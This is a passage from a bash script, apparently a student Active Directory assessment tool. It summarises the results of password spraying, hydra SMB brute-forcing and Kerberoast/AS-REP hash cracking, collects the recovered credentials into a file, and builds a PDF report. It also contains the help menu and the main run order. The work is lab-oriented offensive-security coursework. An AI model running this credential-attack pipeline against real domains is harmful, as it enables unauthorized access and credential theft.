}

# ============================================================
# PHASE 5 - Results summary + interactive search (Req 4.2 / 4.3)
# ============================================================

# ---------- show_results: 4.2 summary of the run ----------
show_results() {
    print_header "5. Results Summary"
    echo -e "${GREEN} Target range :${NC} $NETWORK"
    echo -e "${GREEN} Domain       :${NC} $DOMAIN"
    echo -e "${GREEN} DC IP        :${NC} ${DC_IP:-<not found>}"
    echo -e "${GREEN} DHCP IP      :${NC} ${DHCP_IP:-<not found>}"
    echo -e "${GREEN} Levels       :${NC} scan=$LVL_SCAN enum=$LVL_ENUM expl=$LVL_EXPL"

    # live hosts count
    local hosts
    hosts=$(get_live_hosts 2>/dev/null)
    [[ -n "$hosts" ]] && echo -e "${GREEN} Live hosts   :${NC} $(echo "$hosts" | wc -l)"

    # --- consolidate every recovered credential into one creds.txt ---
    local creds="$OUTPUT_DIR/creds.txt"
    : > "$creds"
    # (a) password-spray hits: pull "user:password" out of CME's [+] lines
    if [[ -s "$OUTPUT_DIR/exploit_spray.txt" ]]; then
        grep -oE '[^ ]+\\[^ ]+:[^ ]+' "$OUTPUT_DIR/exploit_spray.txt" 2>/dev/null \
            | sort -u | sed 's/^/[spray] /' >> "$creds"
    fi
    # (b) cracked Kerberos hashes (john --show gave user:password lines)
    if [[ -s "$OUTPUT_DIR/cracked.txt" ]]; then
        sed 's/^/[kerberos] /' "$OUTPUT_DIR/cracked.txt" >> "$creds"
    fi
    # (c) hydra hits: "[445][smb] host: IP   login: user   password: pass"
    if [[ -s "$OUTPUT_DIR/hydra_smb.txt" ]]; then
        grep -oE 'login: *[^ ]+ +password: *[^ ]+' "$OUTPUT_DIR/hydra_smb.txt" 2>/dev/null \
            | sed 's/login: *//; s/ *password: */:/; s/^/[hydra] /' >> "$creds"
    fi

    if [[ -s "$creds" ]]; then
        echo -e "${RED}[!] Credentials recovered (user:password):${NC}"
        sed 's/^/    /' "$creds"
    else
        echo -e "${YELLOW}[i] No credentials recovered (none in the password list).${NC}"
    fi

    echo -e "\n${GREEN}[+] Output files in $OUTPUT_DIR:${NC}"
    ls -1 "$OUTPUT_DIR" | sed 's/^/    /'
}

# ---------- search_results: 4.3 interactive grep over all output files (reused from VULNER) ----------
search_results() {
    print_header "Interactive Search"
    local term
    while true; do
        read -rp ">> Search term (Enter to skip/finish): " term
        [[ -z "$term" ]] && { echo -e "${YELLOW} -> Search finished.${NC}"; break; }
        echo -e "${CYAN} -> Matches for '$term':${NC}"
        if grep -rin --color=never "$term" "$OUTPUT_DIR" 2>/dev/null; then
            :
        else
            echo -e "${YELLOW}    (no matches)${NC}"
        fi
    done
}

# ============================================================
# PHASE 6 - PDF report engine (Requirement 5.1)
# ============================================================

# ---------- html_section: embed one saved output file inside a <pre> block ----------
html_section() {
    local title="$1" file="$2" html="$3"
    echo "<h2>$title</h2>" >> "$html"
    if [[ -s "$file" ]]; then
        echo "<pre>" >> "$html"
        # escape &, <, > so raw tool output renders correctly
        sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g' "$file" >> "$html"
        echo "</pre>" >> "$html"
    else
        echo "<p><i>(not run / no output)</i></p>" >> "$html"
    fi
}

# ---------- generate_pdf: assemble HTML report and convert to PDF ----------
generate_pdf() {
    print_header "6. PDF Report"
    local html="$OUTPUT_DIR/report.html"
    # Submission naming: UNIT.STUDENT.PROGRAM.pdf (matches the .sh)
    local pdf="$OUTPUT_DIR/TMagen773640.S12.zx305.pdf"

    # --- title page + header block ---
    cat > "$html" <<EOF
<!DOCTYPE html><html><head><meta charset="utf-8"><style>
body{font-family:Arial,sans-serif;margin:30px;color:#222;}
h1{color:#0b5;border-bottom:3px solid #0b5;}
h2{color:#06c;margin-top:24px;border-bottom:1px solid #ccc;}
pre{background:#f4f4f4;border:1px solid #ddd;padding:10px;font-size:11px;
    white-space:pre-wrap;word-wrap:break-word;}
table{border-collapse:collapse;} td{border:1px solid #ccc;padding:4px 8px;}
</style></head><body>
<h1>DOMAIN MAPPER - AD Assessment Report</h1>
<table>
<tr><td>Student</td><td>WUBET ABIE</td></tr>
<tr><td>Student Code</td><td>S12</td></tr>
<tr><td>Unit</td><td>TMagen773640</td></tr>
<tr><td>Program</td><td>ZX305</td></tr>
<tr><td>Lecturer</td><td>Eliran Berkovich</td></tr>
<tr><td>Date</td><td>$(date)</td></tr>
<tr><td>Target range</td><td>$NETWORK</td></tr>
<tr><td>Domain</td><td>$DOMAIN</td></tr>
<tr><td>DC IP</td><td>${DC_IP:-not found}</td></tr>
<tr><td>DHCP IP</td><td>${DHCP_IP:-not found}</td></tr>
<tr><td>Levels</td><td>scan=$LVL_SCAN enum=$LVL_ENUM expl=$LVL_EXPL</td></tr>
</table>
EOF

    # --- build a clean results-summary file to embed (Req 5) ---
    local sumf="$OUTPUT_DIR/results_summary.txt"
    {
        echo "Target range : $NETWORK"
        echo "Domain       : $DOMAIN"
        echo "DC IP        : ${DC_IP:-<not found>}"
        echo "DHCP IP      : ${DHCP_IP:-<not found>}"
        echo "Levels       : scan=$LVL_SCAN enum=$LVL_ENUM expl=$LVL_EXPL"
        local hcount; hcount=$(get_live_hosts 2>/dev/null | wc -l)
        echo "Live hosts   : $hcount"
        echo "Output files :"
        ls -1 "$OUTPUT_DIR" 2>/dev/null | sed 's/^/  - /'
    } > "$sumf"

    # --- one section per stage (skips cleanly if a file is absent) ---
    html_section "1. Target subnet (sipcalc)"     "$OUTPUT_DIR/network_info.txt"     "$html"
    html_section "2. Scanning (nmap TCP/UDP)"     "$OUTPUT_DIR/scan.nmap"            "$html"
    html_section "3.1 Enumeration - Basic (DC/DHCP/services)" "$OUTPUT_DIR/enum_basic.txt" "$html"
    html_section "3.2 Enumeration - Intermediate (per-service + shares)" "$OUTPUT_DIR/enum_intermediate.txt" "$html"
    html_section "3.2 Enumeration - NSE scripts" "$OUTPUT_DIR/enum_nse.txt"         "$html"
    html_section "3.2 Enumeration - enum4linux"  "$OUTPUT_DIR/enum4linux.txt"       "$html"
    html_section "3.3 Enumeration - Advanced (AD objects)" "$OUTPUT_DIR/enum_advanced.txt" "$html"
    html_section "Discovered domain users"       "$OUTPUT_DIR/users.txt"            "$html"
    html_section "4.1 Exploitation - Vuln scan (NSE)" "$OUTPUT_DIR/exploit_vuln.txt" "$html"
    html_section "4.2 Exploitation - Password spray" "$OUTPUT_DIR/exploit_spray.txt" "$html"
    html_section "4.2 Exploitation - hydra SMB brute-force" "$OUTPUT_DIR/hydra_smb.txt" "$html"
    html_section "4.3 Exploitation - AS-REP hashes" "$OUTPUT_DIR/asrep.hash"        "$html"
    html_section "4.3 Exploitation - Kerberoast (SPN) hashes" "$OUTPUT_DIR/spn.hash" "$html"
    html_section "4.3 Exploitation - Cracked credentials" "$OUTPUT_DIR/cracked.txt" "$html"
    html_section "Credentials recovered (spray + cracked)" "$OUTPUT_DIR/creds.txt"  "$html"
    html_section "5. Results Summary"            "$sumf"                            "$html"
    html_section "Full command log"              "$LOG_FILE"                        "$html"
    echo "</body></html>" >> "$html"

    # --- convert with whichever engine check_deps found ---
    echo -e "${CYAN} -> Converting report with $PDF_BIN...${NC}"
    case "$PDF_BIN" in
        wkhtmltopdf)
            wkhtmltopdf "$html" "$pdf" >/dev/null 2>&1 ;;
        pandoc)
            pandoc "$html" -o "$pdf" >/dev/null 2>&1 ;;
        enscript)
            # plain-text fallback: drop the <style> block, strip tags, decode entities
            local txt="$OUTPUT_DIR/report.txt"
            sed '/<style>/,/<\/style>/d' "$html" \
                | sed 's/<[^>]*>//g' \
                | sed 's/&lt;/</g; s/&gt;/>/g; s/&amp;/\&/g' \
                | sed '/^[[:space:]]*$/N;/^\n$/D' > "$txt"
            enscript -B -p - "$txt" 2>/dev/null | ps2pdf - "$pdf" ;;
    esac

    if [[ -s "$pdf" ]]; then
        echo -e "${GREEN}[+] PDF generated: $pdf ($(du -h "$pdf" | cut -f1))${NC}"
    else
        echo -e "${RED}[!] PDF generation failed - HTML kept at $html${NC}"
    fi
}

# ============================================================
# PHASE 7 - Creativity: help menu + wizard mode (Req 6.2 / 6.3)
# ============================================================

# ---------- show_help: 6.3 explain how to use the tool ----------
show_help() {
    show_banner
    cat <<EOF
DOMAIN MAPPER (ZX305) - Active Directory assessment tool.

USAGE:
  sudo $0 [option]

OPTIONS:
  -h, --help      Show this help and exit.
  -w, --wizard    Guided mode: explains each level before you pick.
  (no option)     Normal run - prompts for all inputs.

MODES & LEVELS (choose per mode: none/basic/intermediate/advanced):
  SCANNING
    basic         nmap -Pn -sS -sV (skip host discovery)
    intermediate  + all 65535 TCP ports (-p-)
    advanced      + UDP sweep on common ports
  ENUMERATION
    basic         services, identify DC IP + DHCP IP
    intermediate  per-service IP table, SMB shares, 3 NSE scripts
    advanced      (AD creds) users/groups/shares/policy/DA members
  EXPLOITATION
    basic         nmap --script vuln
    intermediate  domain-wide password spraying
    advanced      (AD creds) Kerberos AS-REP/roast + john cracking

NOTES:
  - A higher level automatically includes the lower ones.
  - Advanced enum/exploit need AD credentials; skipped cleanly if blank.
  - Password list defaults to rockyou; every run ends in a PDF report.
  - Run only against your own isolated lab.
EOF
}

# ---------- run_wizard: 6.2 guided level picking ----------
run_wizard() {
    print_header "Wizard Mode"
    echo -e "${CYAN}This guided mode explains each stage, then normal input begins.${NC}"
    echo -e "${YELLOW} SCANNING    ${NC}- how deep to map ports (Pn -> all ports -> UDP)."
    echo -e "${YELLOW} ENUMERATION ${NC}- what to discover (DC/DHCP -> services/shares -> AD objects)."
    echo -e "${YELLOW} EXPLOITATION${NC}- what to test (vuln scan -> spraying -> Kerberos)."
    echo -e "${GREEN} Tip: start with basic/basic/basic to validate the lab, then raise levels.${NC}"
    read -rp ">> Press Enter to begin input... " _
}

# ============================================================
# main - calls every stage in order
# ============================================================
main() {
    # 6.3 help / 6.2 wizard flags parsed before anything else
    case "$1" in
        -h|--help)   show_help; exit 0 ;;
        -w|--wizard) WIZARD=1 ;;
    esac

    START_TIME=$(date +%s)
    show_banner
    check_root
    check_deps

    [[ "${WIZARD:-0}" == 1 ]] && run_wizard
    get_user_input

    scanning_mode

    enumeration_mode

    exploitation_mode

    show_results
    search_results
    generate_pdf

    show_completion_message
    cleanup
}

main "$@"
